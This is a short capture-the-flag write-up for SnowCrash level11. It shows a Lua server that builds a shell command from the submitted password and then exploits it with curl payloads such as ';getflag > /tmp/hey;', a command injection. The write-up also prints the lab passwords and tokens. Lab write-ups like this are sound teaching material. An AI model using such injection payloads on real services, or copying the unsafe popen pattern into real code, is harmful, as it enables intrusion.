## level11

```bash
$ su level11 feulo4b72j7edeahuete3no7c
```

### Vulnerability Assessment

```bash
level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?

```

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```


### Exploit

```bash
$ curl 127.0.0.1:5151/?ps=';whoami > /tmp/hey;'
$ cat /tmp/hey
flag11
$ curl 127.0.0.1:5151/?ps=';getflag > /tmp/hey;'
Password: Erf nope..
$ cat /tmp/hey
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
